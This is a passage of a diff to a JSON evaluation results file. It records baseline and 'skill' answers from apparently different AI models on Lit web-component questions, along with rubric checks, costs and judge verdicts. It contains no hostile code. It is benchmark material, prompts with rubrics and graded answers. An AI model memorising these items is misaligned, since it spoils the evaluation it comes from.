+            "text": "# Lit Lifecycle Method Placement\n\n## (a) Compute derived property from `this.someInput` before render\n**Use `willUpdate(changedProperties)`**\n\n```js\nwillUpdate(changedProperties) {\n  if (changedProperties.has('someInput')) {\n    this.derived = expensiveCompute(this.someInput);\n  }\n}\n```\n\n**Why:** `willUpdate` runs *before* `render()` but after reactive properties have settled. Setting properties here is safe and won't trigger another update cycle. `render()` should stay pure — just return a template based on existing state — so derivation belongs in `willUpdate`.\n\n(Avoid `update()` for this unless you need to control whether the update proceeds; `willUpdate` is the idiomatic hook.)\n\n## (b) One-time DOM measurement after first render\n**Use `firstUpdated(changedProperties)`**\n\n```js\nfirstUpdated() {\n  const rect = this.renderRoot\n    .querySelector('#child')\n    .getBoundingClientRect();\n  this.childWidth = rect.width;\n}\n```\n\n**Why:** `firstUpdated` fires exactly once, after the component's DOM has been rendered and is queryable via `this.renderRoot`. It's the canonical place for one-time DOM setup (measurements, third-party widget initialization, focus management on mount).\n\n## (c) Call external API after every render that changed an input\n**Use `updated(changedProperties)`**\n\n```js\nupdated(changedProperties) {\n  if (changedProperties.has('someInput')) {\n    fetch(`/api/data?q=${this.someInput}`)\n      .then(r => r.json())\n      .then(data => { this.data = data; });\n  }\n}\n```\n\n**Why:** `updated` runs after every render (including the first), and `changedProperties` lets you gate side effects on what actually changed. Side effects like network calls, dispatching events, or imperatively poking other DOM belong here — never in `render()` (which must be pure) or `willUpdate` (which runs before DOM is committed).\n\n---\n\n### Quick mental model\n| Phase | Method | Purpose |\n|---|---|---|\n| Before render | `willUpdate` | Compute derived state |\n| Render | `render` | Pure template only |\n| After first render | `firstUpdated` | One-time DOM setup |\n| After every render | `updated` | Side effects, post-DOM work |",
+            "cost_usd": 0.06069,
+            "rubric": [
+              {
+                "name": "mentions willUpdate",
+                "kind": "must_contain",
+                "passed": true,
+                "evidence": "willUpdate",
+                "why": "derived state before render"
+              },
+              {
+                "name": "mentions firstUpdated",
+                "kind": "must_contain",
+                "passed": true,
+                "evidence": "firstUpdated",
+                "why": "one-time post-first-render setup"
+              },
+              {
+                "name": "mentions updated",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "updated(",
+                "why": "post-update side effects"
+              },
+              {
+                "name": "mentions changedProperties parameter",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "changedProperties",
+                "why": "gates work on what actually changed"
+              }
+            ],
+            "rubric_pass_rate": 1.0
           },
-          {
-            "name": "mentions firstUpdated",
-            "kind": "must_contain",
-            "passed": true,
-            "evidence": "firstUpdated",
-            "why": "one-time post-first-render setup"
+          "skill": {
+            "text": "Great question — Lit's lifecycle is designed so each of these has a clear, distinct home. Here's the mapping:\n\n## (a) Compute a derived property from `this.someInput` before render → `willUpdate(changedProperties)`\n\n```ts\nwillUpdate(changed: PropertyValues<this>) {\n  if (changed.has('someInput')) {\n    this._derived = expensiveCompute(this.someInput);\n  }\n}\n```\n\n**Why:**\n- Runs *before* `render()`, so `render()` can read `this._derived` and the DOM reflects it on the first paint.\n- Runs *once per update cycle*, even if multiple properties changed.\n- Setting properties here does **not** trigger another update (Lit batches it into the in-flight cycle).\n- `render()` must stay pure — no derivation logic there.\n- Doing this in `updated()` would cause a second render cycle (wasteful, can cause flicker).\n\nGate the work on `changedProperties.has('someInput')` so it only recomputes when the relevant input actually changed.\n\n## (b) One-time DOM measurement of a child after first render → `firstUpdated(changedProperties)`\n\n```ts\n@query('#child') private _child!: HTMLElement;\n\nfirstUpdated() {\n  const rect = this._child.getBoundingClientRect();\n  this._initialWidth = rect.width;\n}\n```\n\n**Why:**\n- Called exactly once, after the first `render()` has produced real DOM.\n- The shadow DOM is guaranteed to exist, so `this.shadowRoot`, `@query`, and `getBoundingClientRect()` all work.\n- Doing it in `connectedCallback()` is too early — the element is in the tree but hasn't rendered yet.\n- Doing it in `constructor()` is way too early — no DOM at all.\n- Doing it in `updated()` would re-run on every change (wasteful for one-time setup).\n\nIf you need to *react* to size changes over time, that's a different job — use a `ResizeObserver` in a reactive controller, set up in `hostConnected()`.\n\n## (c) Call an external API after every render where an input changed → `updated(changedProperties)`\n\n```ts\nupdated(changed: PropertyValues<this>) {\n  if (changed.has('userId')) {\n    this._analytics.track('view', { userId: this.userId });\n  }\n}\n```\n\n**Why:**\n- Runs after the DOM is updated, so it's safe for side effects that shouldn't block rendering.\n- Receives `changedProperties`, so you can gate on the specific inputs that should trigger the call.\n- `render()` must be pure — no `fetch()` or analytics calls there.\n- `willUpdate()` runs *before* render, so side effects there happen before the user sees the new state — wrong order for \"post-update notification.\"\n\n**Important caveat:** if \"external API\" means async data fetching (request/response), `updated()` is the wrong tool. Use `@lit/task` instead:\n\n```ts\nprivate _userTask = new Task(this, {\n  task: async ([userId], { signal }) => {\n    const res = await fetch(`/api/users/${userId}`, { signal });\n    return res.json();\n  },\n  args: () => [this.userId],\n});\n```\n\nTask handles cancellation, race conditions, and pending/error/complete states. Use raw `updated()` for fire-and-forget side effects (analytics, logging, imperative third-party library calls).\n\n## Summary table\n\n| Work | Method | Runs | Purpose |\n|------|--------|------|---------|\n| Derive state for render | `willUpdate()` | Before every render | Computed values consumed by `render()` |\n| One-time DOM setup | `firstUpdated()` | Once, after first render | Measure/wire up real DOM |\n| Post-render side effects | `updated()` | After every render | Notify the outside world; gate on `changedProperties` |\n| Async data fetching | `Task` (not a lifecycle method) | When args change | Cancellable request/response with status |\n\nThe mental model: **`willUpdate` prepares → `render` describes → `updated` reacts.** And `firstUpdated` is the one-shot variant of `updated` for setup that only makes sense once.",
+            "cost_usd": 0.18373499999999998,
+            "rubric": [
+              {
+                "name": "mentions willUpdate",
+                "kind": "must_contain",
+                "passed": true,
+                "evidence": "willUpdate",
+                "why": "derived state before render"
+              },
+              {
+                "name": "mentions firstUpdated",
+                "kind": "must_contain",
+                "passed": true,
+                "evidence": "firstUpdated",
+                "why": "one-time post-first-render setup"
+              },
+              {
+                "name": "mentions updated",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "updated(",
+                "why": "post-update side effects"
+              },
+              {
+                "name": "mentions changedProperties parameter",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "changedProperties",
+                "why": "gates work on what actually changed"
+              }
+            ],
+            "rubric_pass_rate": 1.0
           },
-          {
-            "name": "mentions updated",
-            "kind": "any_of",
-            "passed": true,
-            "evidence": "updated(",
-            "why": "post-update side effects"
-          },
-          {
-            "name": "mentions changedProperties parameter",
-            "kind": "any_of",
-            "passed": true,
-            "evidence": "changedProperties",
-            "why": "gates work on what actually changed"
+          "judge": {
+            "winner": "skill",
+            "reasoning": "Both answers correctly map all three tasks to willUpdate, firstUpdated, and updated with good explanations. Answer A is more thorough in explaining the changedProperties parameter with concrete gating examples, adds important nuance about async data fetching with @lit/task, and provides richer 'why not' explanations for alternative approaches. Answer B is more concise but covers all the required criteria adequately. The depth and practical caveats in Answer A make it the stronger response overall.",
+            "per_criterion": [
+              {
+                "name": "mentions willUpdate",
+                "better": "tie"
+              },
+              {
+                "name": "mentions firstUpdated",
+                "better": "tie"
+              },
+              {
+                "name": "mentions updated",
+                "better": "tie"
+              },
+              {
+                "name": "mentions changedProperties parameter",
+                "better": "skill"
+              }
+            ]
           }
-        ],
-        "rubric_pass_rate": 1.0
-      },
-      "judge": {
-        "winner": "tie",
-        "reasoning": "Both answers are essentially equivalent in quality, correctly mapping all three tasks to willUpdate, firstUpdated, and updated with clear explanations. Both mention the changedProperties parameter with practical guard examples, explain the ordering rationale, and include helpful summary tables. Neither answer has a meaningful advantage over the other in accuracy, completeness, or clarity.",
-        "per_criterion": [
-          {
-            "name": "mentions willUpdate",
-            "better": "tie"
+        },
+        "sonnet": {
+          "expectation_met": false,
+          "baseline": {
+            "text": "# Lit Component Lifecycle Placement\n\n## (a) Derived Property from `this.someInput` Before Render\n\n**→ `willUpdate(changedProperties)`**\n\n```javascript\nwillUpdate(changedProperties) {\n  if (changedProperties.has('someInput')) {\n    this.derivedValue = expensiveComputation(this.someInput);\n  }\n}\n```\n\n**Why:**\n- Runs **before** `render()`, so the derived value is ready when the template is evaluated\n- Guaranteed to run on both client and server (SSR-safe)\n- `update()` would also work but `willUpdate` is the semantic fit — it exists specifically for pre-render derivation\n- Do **not** use `updated()` — that runs after render, causing a wasted paint cycle\n- Do **not** set reactive properties here (use plain class fields), otherwise you trigger another update cycle\n\n---\n\n## (b) One-Time DOM Measurement After First Render\n\n**→ `firstUpdated(changedProperties)`**\n\n```javascript\nfirstUpdated() {\n  const rect = this.shadowRoot\n    .querySelector('.target')\n    .getBoundingClientRect();\n  this.initialHeight = rect.height;\n}\n```\n\n**Why:**\n- Runs **once**, after the component's first `update()` completes and the DOM is committed\n- The element is guaranteed to be in the DOM and measurable at this point\n- `connectedCallback` is too early — shadow DOM children may not be rendered yet\n- `updated()` would re-run on every change — wasteful and potentially incorrect for a \"snapshot\" measurement\n- If you need to wait for sub-element rendering, `await this.updateComplete` inside here is valid\n\n---\n\n## (c) External API Call After Every Render That Changed an Input\n\n**→ `updated(changedProperties)`**\n\n```javascript\nupdated(changedProperties) {\n  if (changedProperties.has('someInput')) {\n    this.fetchData(this.someInput).then(result => {\n      this.result = result; // reactive property, triggers re-render\n    });\n  }\n}\n```\n\n**Why:**\n- Runs **after every update**, with access to what actually changed via `changedProperties`\n- The guard `changedProperties.has('someInput')` prevents unnecessary API calls on unrelated re-renders\n- Runs after DOM is committed, so any DOM side effects from the API response are safe\n- Do **not** do this in `willUpdate` — the DOM isn't ready and you'd be firing async work before the render it corresponds to is even painted\n- Be careful: setting a reactive property in `updated()` triggers another update cycle — that's intentional here but must be guarded to avoid infinite loops\n\n---\n\n## Summary Table\n\n| Task | Method | Timing | Runs |\n|---|---|---|---|\n| Derive from input | `willUpdate()` | Before render | Every relevant change |\n| Measure DOM once | `firstUpdated()` | After first render | Once |\n| Call API on input change | `updated()` | After every render | Every relevant change |\n\nThe core principle: **before the DOM → `willUpdate`, after the DOM → `updated`/`firstUpdated`**, and always guard with `changedProperties.has()` to avoid unnecessary work.",
+            "cost_usd": 0.011763000000000001,
+            "rubric": [
+              {
+                "name": "mentions willUpdate",
+                "kind": "must_contain",
+                "passed": true,
+                "evidence": "willUpdate",
+                "why": "derived state before render"
+              },
+              {
+                "name": "mentions firstUpdated",
+                "kind": "must_contain",
+                "passed": true,
+                "evidence": "firstUpdated",
+                "why": "one-time post-first-render setup"
+              },
+              {
+                "name": "mentions updated",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "updated(",
+                "why": "post-update side effects"
+              },
+              {
+                "name": "mentions changedProperties parameter",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "changedProperties",
+                "why": "gates work on what actually changed"
+              }
+            ],
+            "rubric_pass_rate": 1.0
           },
-          {
-            "name": "mentions firstUpdated",
-            "better": "tie"
+          "skill": {
+            "text": "## Lifecycle Placement for Each Kind of Work\n\n### (a) Derived property — `willUpdate()`\n\n```typescript\n@customElement('my-component')\nexport class MyComponent extends LitElement {\n  @property({ type: Number }) price = 0;\n  @property({ type: Number }) quantity = 0;\n\n  // Derived state: plain fields, not @state() — no extra update cycle\n  protected total = 0;\n  protected formattedTotal = '';\n\n  protected willUpdate(changed: PropertyValues<this>): void {\n    // Runs before render(), so the template sees fresh values immediately\n    if (changed.has('price') || changed.has('quantity')) {\n      this.total = this.price * this.quantity;\n      this.formattedTotal = new Intl.NumberFormat('en-US', {\n        style: 'currency',\n        currency: 'USD',\n      }).format(this.total);\n    }\n  }\n\n  render() {\n    // formattedTotal is always current — no stale-value risk\n    return html`<p>Total: ${this.formattedTotal}</p>`;\n  }\n}\n```\n\n**Why `willUpdate()` and not somewhere else:**\n\n| Alternative | Problem |\n|-------------|---------|\n| Inside `render()` | Makes `render()` impure — it should be a pure projection of state to DOM |\n| `@state()` field set in `updated()` | Triggers a *second* update cycle — wasteful and can cause loops |\n| Constructor / `connectedCallback` | Doesn't re-run when inputs change |\n\n`willUpdate()` is the one place guaranteed to run before every render, after properties are set, with access to `changedProperties` so you can guard the computation.\n\n---\n\n### (b) One-time DOM measurement — `firstUpdated()`\n\n```typescript\n@customElement('my-component')\nexport class MyComponent extends LitElement {\n  @query('canvas') private _canvas!: HTMLCanvasElement;\n\n  private _chart: Chart | null = null;\n\n  protected firstUpdated(): void {\n    // Shadow DOM is fully rendered exactly once here\n    const { width, height } = this._canvas.getBoundingClientRect();\n\n    this._chart = new Chart(this._canvas, {\n      initialWidth: width,\n      initialHeight: height,\n    });\n  }\n\n  disconnectedCallback(): void {\n    super.disconnectedCallback();\n    this._chart?.destroy(); // clean up the external resource\n  }\n\n  render() {\n    return html`<canvas></canvas>`;\n  }\n}\n```\n\n**Why `firstUpdated()` and not somewhere else:**\n\n| Alternative | Problem |\n|-------------|---------|\n| `constructor` | Shadow DOM doesn't exist yet — `querySelector` returns `null` |\n| `connectedCallback` | Lit hasn't rendered yet at this point |\n| `updated()` | Runs after *every* update — you'd re-initialize the chart on every property change |\n\n`firstUpdated()` fires once, after the initial render, with the DOM present. It's the right place for \"set up an external thing that owns a DOM node.\"\n\n---\n\n### (c) External API call after relevant input changes — `updated()`\n\n```typescript\n@customElement('my-component')\nexport class MyComponent extends LitElement {\n  @property() userId = '';\n\n  protected updated(changed: PropertyValues<this>): void {\n    if (changed.has('userId') && this.userId) {\n      // Guard is critical — updated() runs after every update cycle\n      this._syncToAnalytics(this.userId);\n    }\n  }\n\n  private _syncToAnalytics(id: string): void {\n    // Fire-and-forget side effect; not data fetching (use Task for that)\n    navigator.sendBeacon('/api/analytics', JSON.stringify({ userId: id }));\n  }\n\n  render() {\n    return html`<p>Viewing user: ${this.userId}</p>`;\n  }\n}\n```\n\n**Why `updated()` and not somewhere else:**\n\n| Alternative | Problem |\n|-------------|---------|\n| `willUpdate()` | DOM hasn't rendered yet — the \"after render\" guarantee is missing |\n| `render()` | Impure; may be called speculatively by Lit |\n| Unconditional `updated()` | Fires on *every* update, not just when `userId` changed — causes runaway calls |\n\nThe `changed.has('key')` guard is non-negotiable. Without it, every unrelated property change (a CSS class toggle, a loading flag) triggers the API call.\n\n> **Note:** If this were *fetching* data rather than pushing a side effect, use `@lit/task` instead — it handles cancellation, race conditions, and loading states that `updated()` doesn't.\n\n---\n\n### Summary\n\n```\nProperty change\n      │\n      ▼\n willUpdate()  ← (a) derive computed state from new inputs\n      │\n      ▼\n   render()    ← pure: reads this.* and returns html``\n      │\n      ▼\n  updated()    ← (c) side effects that react to specific changes\n      │\n      ▼  (first render only)\nfirstUpdated() ← (b) one-time DOM measurement / external lib init\n```\n\nThe underlying principle is the same in each case: **match the method to when the DOM and data are in the state your work requires**, and always guard `updated()` with `changed.has()` to avoid runaway effects.",
+            "cost_usd": 0.031247999999999998,
+            "rubric": [
+              {
+                "name": "mentions willUpdate",
+                "kind": "must_contain",
+                "passed": true,
+                "evidence": "willUpdate",
+                "why": "derived state before render"
+              },
+              {
+                "name": "mentions firstUpdated",
+                "kind": "must_contain",
+                "passed": true,
+                "evidence": "firstUpdated",
+                "why": "one-time post-first-render setup"
+              },
+              {
+                "name": "mentions updated",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "updated(",
+                "why": "post-update side effects"
+              },
+              {
+                "name": "mentions changedProperties parameter",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "changedProperties",
+                "why": "gates work on what actually changed"
+              }
+            ],
+            "rubric_pass_rate": 1.0
           },
-          {
-            "name": "mentions updated",
-            "better": "tie"
-          },
-          {
-            "name": "mentions changedProperties parameter",
-            "better": "tie"
+          "judge": {
+            "winner": "tie",
+            "reasoning": "Both answers correctly map all three tasks to willUpdate, firstUpdated, and updated, explain the changedProperties parameter with guards, and provide clear rationale. Answer A is slightly more concise and readable, while Answer B provides more detailed TypeScript examples, comparison tables for alternatives, and a useful note about @lit/task for data fetching. Both are essentially equivalent in correctness and coverage of all rubric criteria.",
+            "per_criterion": [
+              {
+                "name": "mentions willUpdate",
+                "better": "tie"
+              },
+              {
+                "name": "mentions firstUpdated",
+                "better": "tie"
+              },
+              {
+                "name": "mentions updated",
+                "better": "tie"
+              },
+              {
+                "name": "mentions changedProperties parameter",
+                "better": "tie"
+              }
+            ]
           }
-        ]
+        }
       }
     },
     {
       "id": "state-vs-property",
       "prompt": "In Lit, when should I use @state() versus @property() on a class\nfield? I'm a bit unclear on the distinction.\n",
       "expectation": "skill_wins",
-      "expectation_met": true,
-      "baseline": {
-        "text": "# `@state()` vs `@property()` in Lit\n\nBoth decorators make a class field **reactive** (changes trigger a re-render), but they differ in their **public API surface**:\n\n## `@property()` — Public, External API\n\nUse this when the field is part of the component's **public interface** and should be settable from outside the element.\n\n- Exposed as an **HTML attribute** (by default) — e.g., `<my-element name=\"Alice\">`\n- Synced between the JS property and the DOM attribute\n- Configurable: `type`, `attribute`, `reflect`, `converter`, etc.\n- Should be considered part of your component's contract\n\n```ts\n@property({ type: String })\nname = '';\n\n@property({ type: Number, reflect: true })\ncount = 0;\n```\n\n## `@state()` — Private, Internal State\n\nUse this for **internal** reactive state that consumers of the element shouldn't know or care about.\n\n- **No** associated HTML attribute\n- Not part of the public API\n- Triggers re-renders just like `@property()`\n- Safe to rename/remove without breaking consumers\n- Minifiers/closure compiler can mangle the name\n\n```ts\n@state()\nprivate _isOpen = false;\n\n@state()\nprivate _fetchedData: User[] = [];\n```\n\n## Quick Decision Guide\n\n| Question | Use |\n|---|---|\n| Should a parent component / HTML author set this? | `@property()` |\n| Is it derived from props, fetched data, UI state (open/closed, hover, etc.)? | `@state()` |\n| Should it appear as an attribute in the DOM? | `@property()` (with `reflect: true` if you want JS→attr sync) |\n| Is it private implementation detail? | `@state()` |\n\n## Rule of Thumb\n\n> Start with `@state()`. Only \"promote\" a field to `@property()` when you have a concrete reason to expose it externally.\n\nThis keeps your public API minimal and your refactors safer.",
-        "cost_usd": 0.031677500000000004,
-        "rubric": [
-          {
-            "name": "identifies @property as public API / attribute-synced",
-            "kind": "any_of",
-            "passed": true,
-            "evidence": "public",
-            "why": "right framing"
+      "judge_focus": "The better answer explains @property is the public reactive API\n(synced with HTML attribute by default), @state is internal-only\n(no attribute), and gives concrete examples of each.\n",
+      "models": {
+        "haiku": {
+          "expectation_met": true,
+          "baseline": {
+            "text": "# @state() vs @property() in Lit\n\nThe key distinction is about **reactivity** and **what triggers re-renders**:\n\n## @state()\nUse this for **internal component state** that should trigger re-renders when changed.\n\n```javascript\nimport { LitElement, html } from 'lit';\nimport { state } from 'lit/decorators.js';\n\nclass MyComponent extends LitElement {\n  @state()\n  count = 0;\n\n  render() {\n    return html`\n      <p>Count: ${this.count}</p>\n      <button @click=${() => this.count++}>Increment</button>\n    `;\n  }\n}\n```\n\n**Characteristics:**\n- Private to the component (by convention, prefix with `_`)\n- Changes trigger a re-render\n- Not exposed as HTML attributes\n- Not reflected to attributes\n\n## @property()\nUse this for **public properties** that can be set from outside and should trigger re-renders.\n\n```javascript\nimport { LitElement, html } from 'lit';\nimport { property } from 'lit/decorators.js';\n\nclass MyComponent extends LitElement {\n  @property()\n  name = 'World';\n\n  render() {\n    return html`<p>Hello ${this.name}!</p>`;\n  }\n}\n```\n\n**Characteristics:**\n- Public API for your component\n- Can be set as HTML attributes: `<my-component name=\"Alice\"></my-component>`\n- Changes trigger a re-render\n- Can be configured to reflect back to attributes\n\n## Quick Comparison\n\n| Feature | @state() | @property() |\n|---------|----------|------------|\n| **Purpose** | Internal state | Public API |\n| **Triggers re-render** | ✅ Yes | ✅ Yes |\n| **Set from outside** | ❌ No | ✅ Yes |\n| **HTML attribute** | ❌ No | ✅ Yes (by default) |\n| **Convention** | `_privateState` | `publicProp` |\n\n## Real-world example\n\n```javascript\nclass UserCard extends LitElement {\n  @property()\n  userId = '';  // Set by parent: <user-card userId=\"123\"></user-card>\n\n  @state()\n  _loading = false;  // Internal state\n\n  @state()\n  _userData = null;  // Internal state\n\n  async connectedCallback() {\n    super.connectedCallback();\n    this._loading = true;\n    this._userData = await fetchUser(this.userId);\n    this._loading = false;\n  }\n\n  render() {\n    return this._loading \n      ? html`<p>Loading...</p>`\n      : html`<p>${this._userData.name}</p>`;\n  }\n}\n```\n\n**Rule of thumb:** Use `@property()` for anything the parent component needs to control, and `@state()` for everything else.",
+            "cost_usd": 0.003497,
+            "rubric": [
+              {
+                "name": "identifies @property as public API / attribute-synced",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "public",
+                "why": "right framing"
+              },
+              {
+                "name": "identifies @state as internal / no attribute",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "internal",
+                "why": "the key distinction"
+              },
+              {
+                "name": "mentions reactive trigger / re-render",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "triggers re-render",
+                "why": "both are reactive — the difference is exposure, not reactivity"
+              }
+            ],
+            "rubric_pass_rate": 1.0
           },
-          {
-            "name": "identifies @state as internal / no attribute",
-            "kind": "any_of",
-            "passed": true,
-            "evidence": "Internal",
-            "why": "the key distinction"
+          "skill": {
+            "text": "# @state() vs @property() in Lit\n\nThe distinction is about **API surface and reactivity scope**:\n\n## @property() — Public API, Attribute Binding\n\nUse `@property()` for inputs that:\n- Are part of your component's **public contract** — consumers set them\n- Should be **settable via HTML attributes** (with optional type conversion)\n- Represent **external data flowing in** from a parent or attribute\n\n```ts\nimport { LitElement, html } from 'lit';\nimport { customElement, property } from 'lit/decorators.js';\n\n@customElement('user-card')\nexport class UserCard extends LitElement {\n  @property() name: string = '';\n  @property() email: string = '';\n  @property({ type: Number }) age: number = 0;\n\n  render() {\n    return html`<h1>${this.name}</h1><p>${this.email}</p>`;\n  }\n}\n```\n\n**Consumers use it like this:**\n```html\n<user-card name=\"Alice\" email=\"alice@example.com\" age=\"30\"></user-card>\n```\n\nOr via JavaScript:\n```ts\nconst card = document.querySelector('user-card');\ncard.name = 'Bob';\n```\n\n## @state() — Private Internal State, No Attributes\n\nUse `@state()` for state that:\n- Is **internal to the component** — consumers don't set it\n- Drives rendering but **doesn't need attribute binding**\n- Changes in response to user interaction, async operations, or internal logic\n\n```ts\n@customElement('counter-button')\nexport class CounterButton extends LitElement {\n  @state() private count = 0;\n\n  render() {\n    return html`<button @click=${this._increment}>Count: ${this.count}</button>`;\n  }\n\n  private _increment() {\n    this.count++;\n  }\n}\n```\n\n**Consumers can't set it via attributes:**\n```html\n<!-- This does nothing; count is not an attribute -->\n<counter-button count=\"5\"></counter-button>\n```\n\nThey *can* read it via JavaScript, but it's not part of the intended API:\n```ts\nconst btn = document.querySelector('counter-button');\nconsole.log(btn.count); // 0 (initial value)\n```\n\n## Key Differences\n\n| Aspect | `@property()` | `@state()` |\n|--------|--------------|-----------|\n| **Attribute binding** | ✅ Yes (by default) | ❌ No |\n| **Public API** | ✅ Yes | ❌ No (private by convention) |\n| **Type conversion** | ✅ Configurable | ❌ N/A |\n| **Reflection** | ✅ Optional (reflects to attribute) | ❌ No |\n| **Use case** | External inputs | Internal state |\n\n## Practical Example: Form Input Component\n\n```ts\n@customElement('my-input')\nexport class MyInput extends LitElement {\n  // Public API: consumers set the label via attribute or property\n  @property() label: string = '';\n\n  // Internal state: tracks whether the input is focused\n  @state() private isFocused = false;\n\n  render() {\n    return html`\n      <label>${this.label}</label>\n      <input\n        @focus=${() => (this.isFocused = true)}\n        @blur=${() => (this.isFocused = false)}\n      />\n      ${this.isFocused ? html`<p>Focused!</p>` : nothing}\n    `;\n  }\n}\n```\n\n- `label` is `@property()` because the parent sets it\n- `isFocused` is `@state()` because it's internal and changes on user interaction\n\n## Mutation Rules Apply to Both\n\nBoth trigger re-renders on **reference change** (`!==`), not mutation:\n\n```ts\n// ❌ Won't trigger update\nthis.items.push(newItem);\n\n// ✅ Triggers update\nthis.items = [...this.items, newItem];\n```\n\nThis applies equally to `@property()` and `@state()`.\n\n## When in Doubt\n\n- **Can a parent/consumer reasonably set this?** → `@property()`\n- **Is this only for internal bookkeeping?** → `@state()`\n\nMost components have a mix: a few `@property()` inputs and several `@state()` fields tracking UI state, async progress, or derived values.",
+            "cost_usd": 0.009151,
+            "rubric": [
+              {
+                "name": "identifies @property as public API / attribute-synced",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "Public",
+                "why": "right framing"
+              },
+              {
+                "name": "identifies @state as internal / no attribute",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "Internal",
+                "why": "the key distinction"
+              },
+              {
+                "name": "mentions reactive trigger / re-render",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "trigger re-render",
+                "why": "both are reactive — the difference is exposure, not reactivity"
+              }
+            ],
+            "rubric_pass_rate": 1.0
           },
-          {
-            "name": "mentions reactive trigger / re-render",
-            "kind": "any_of",
-            "passed": true,
-            "evidence": "trigger a re-render",
-            "why": "both are reactive — the difference is exposure, not reactivity"
+          "judge": {
+            "winner": "skill",
+            "reasoning": "Both answers cover the core distinction well, but Answer B is more thorough and idiomatic. It explicitly notes that @state properties don't respond to HTML attributes (with a concrete example showing the attribute being ignored), covers type conversion for @property, includes the mutation rules for triggering re-renders, and uses TypeScript with proper access modifiers which is more idiomatic for Lit. Answer A is solid but slightly less complete on the attribute-binding nuances.",
+            "per_criterion": [
+              {
+                "name": "identifies @property as public API / attribute-synced",
+                "better": "skill"
+              },
+              {
+                "name": "identifies @state as internal / no attribute",
+                "better": "skill"
+              },
+              {
+                "name": "mentions reactive trigger / re-render",
+                "better": "tie"
+              }
+            ]
           }
-        ],
-        "rubric_pass_rate": 1.0
-      },
-      "skill": {
-        "text": "# `@state()` vs `@property()` in Lit\n\nThe distinction comes down to **whether the field is part of your component's public API**.\n\n## `@property()` — Public, reactive, externally settable\n\nUse this when the field should be settable from outside the component (HTML attributes or parent components):\n\n```ts\n@property({ type: String })\nname = 'world';\n\n@property({ type: Number })\ncount = 0;\n```\n\nKey behaviors:\n- **Reflected to/from an HTML attribute** by default, so `<my-el name=\"Alice\">` works.\n- Part of the component's documented public API.\n- Triggers a re-render when changed.\n- Supports converters (`type: Number`, `type: Boolean`, etc.) and `reflect: true` to push changes back to the attribute.\n\n## `@state()` — Private, reactive, internal only\n\nUse this for internal reactive state that shouldn't be controlled from outside:\n\n```ts\n@state()\nprivate _isOpen = false;\n\n@state()\nprivate _fetchedData?: User[];\n```\n\nKey behaviors:\n- **No associated attribute** — can't be set via markup.\n- Not part of the public API (conventionally prefixed with `_` and marked `private`).\n- Still triggers a re-render when changed.\n- Renamed/minified safely by build tools, since it isn't observed externally.\n\n## Quick decision guide\n\n| Question | Use |\n|---|---|\n| Should a parent set this via an HTML attribute? | `@property()` |\n| Should a parent set this via a JS property? | `@property()` |\n| Is it derived from a fetch, timer, internal toggle, etc.? | `@state()` |\n| Could exposing it lock you into an API contract you don't want? | `@state()` |\n\n## Common gotcha\n\nIf you put `@property()` on something that holds an object/array and mutate it in place (e.g. `this.items.push(x)`), Lit won't detect the change — you need to reassign (`this.items = [...this.items, x]`). The same applies to `@state()`. Reactivity is triggered by **identity changes**, not deep mutation, regardless of which decorator you used.\n\n## Rule of thumb\n\n> Default to `@state()` for anything internal. Only \"promote\" a field to `@property()` when you have a real reason for the outside world to control it.\n\nThis keeps your component's API surface small and intentional.",
-        "cost_usd": 0.03487250000000001,
-        "rubric": [
-          {
-            "name": "identifies @property as public API / attribute-synced",
-            "kind": "any_of",
-            "passed": true,
-            "evidence": "public",
-            "why": "right framing"
+        },
+        "sonnet": {
+          "expectation_met": true,
+          "baseline": {
+            "text": "## `@state()` vs `@property()` in Lit\n\nBoth decorators trigger re-renders when their values change, but they serve different purposes.\n\n---\n\n### `@property()` — Public API\n\nUse this for values that should be **exposed to the outside world**.\n\n```javascript\nclass MyButton extends LitElement {\n  @property({ type: String }) label = 'Click me';\n  @property({ type: Boolean }) disabled = false;\n}\n```\n\n```html\n<!-- These can be set from outside the component -->\n<my-button label=\"Submit\" disabled></my-button>\n```\n\n**Characteristics:**\n- Reflected to/from HTML attributes (configurable)\n- Shows up in the element's public API\n- Can be set by parent components or plain HTML\n- Included in `observedAttributes`\n\n---\n\n### `@state()` — Private Internal State\n\nUse this for values that are **internal implementation details**.\n\n```javascript\nclass MyDropdown extends LitElement {\n  @property({ type: Array }) items = [];  // public input\n\n  @state() private isOpen = false;        // internal state\n  @state() private selectedIndex = -1;   // internal state\n}\n```\n\n**Characteristics:**\n- No attribute reflection\n- Not part of the public API\n- Signals to other developers \"don't touch this from outside\"\n- Slightly more efficient (skips attribute handling)\n\n---\n\n### Side-by-Side Comparison\n\n| Feature | `@property()` | `@state()` |\n|---|---|---|\n| Triggers re-render | ✅ | ✅ |\n| Attribute reflection | ✅ (by default) | ❌ |\n| Public API | ✅ | ❌ |\n| Set via HTML attribute | ✅ | ❌ |\n| TypeScript convention | `public` | `private` / `protected` |\n\n---\n\n### `@state()` is essentially shorthand\n\n```javascript\n// These are equivalent:\n@state()\nprivate isOpen = false;\n\n@property({ state: true, attribute: false })\nprivate isOpen = false;\n```\n\n---\n\n### Quick Decision Rule\n\n> **\"Does anything outside this component need to set or read this value?\"**\n> - **Yes** → `@property()`\n> - **No** → `@state()`\n\nThink of it like class visibility: `@property()` is `public`, `@state()` is `private`.",
+            "cost_usd": 0.008691,
+            "rubric": [
+              {
+                "name": "identifies @property as public API / attribute-synced",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "Public",
+                "why": "right framing"
+              },
+              {
+                "name": "identifies @state as internal / no attribute",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "Internal",
+                "why": "the key distinction"
+              },
+              {
+                "name": "mentions reactive trigger / re-render",
+                "kind": "any_of",
+                "passed": true,
+                "evidence": "trigger re-render",
+                "why": "both are reactive — the difference is exposure, not reactivity"
+              }
+            ],
+            "rubric_pass_rate": 1.0
           },
-          {
